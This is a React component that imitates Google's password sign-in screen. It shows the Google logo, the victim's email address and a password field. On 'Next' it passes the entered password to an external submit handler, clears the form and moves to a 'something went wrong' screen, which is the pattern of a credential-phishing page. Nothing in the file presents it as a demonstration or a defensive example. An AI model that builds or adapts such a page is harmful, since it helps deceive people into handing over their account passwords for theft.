import React, { useState } from 'react';
import googleLogo from './Google_2015_logo.svg.png';
import './styles.css';

const Password = ({ setScreen, inputData, setInputData, onSubmit }) => {
	const [checkbox, setCheckbox] = useState(false);

	const setPassword = (val) => {
		setInputData({ ...inputData, password: val });
	};

	const ongoToNext = () => {
		console.log('call api')
		onSubmit();
		setInputData({ email: '', password: ''});
		setScreen('wentWrong')
	}

	return (
		<div className="email_container">
			<div>
				<img src={googleLogo} style={{ height: '25px' }} alt="google icon" />
			</div>
			<p className="email_signin">Welcome</p>
			<p className="mail_address_bubble">
				<span>ico</span>
				<span style={{ opacity: '0.8', marginLeft: '6px' }}>
					{inputData.email}
				</span>
			</p>
			<div className="email_input_cover">
				<div className="text-field">
					<input
						className="input"
						onChange={(e) => setPassword(e.target.value)}
						type={`${checkbox ? 'text' : 'password'}`}
						autoComplete="new-password"
						required
					/>
					<label>Enter your password</label>
				</div>
				<div>
					<input
						onClick={() => setCheckbox(!checkbox)}
						style={{ height: '15px', outline: 'none' }}
						type="checkbox"
					/>
					<span
						style={{
							fontSize: '14px',
							marginLeft: '15px',
							marginTop: '-5px',
							opacity: '0.9',
						}}
					>
						Show password
					</span>
				</div>
			</div>
			<div className="email_next_container">
				<a
					style={{
						color: '#1a73e8',
						opacity: '0.8',
						cursor: 'pointer',
						fontWeight: 600,
						fontSize: '15px',
						textDecoration: 'none',
					}}
					href="https://accounts.google.com/signup/v2/webcreateaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ltmpl=default&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp"
					target="_blank"
					rel="noreferrer"
				>
					Forgot password?
				</a>
				<button
					disabled={!inputData.password.trim()}
					onClick={ongoToNext}
					className="button"
				>
					Next
				</button>
			</div>
		</div>
	);
};

export default Password;
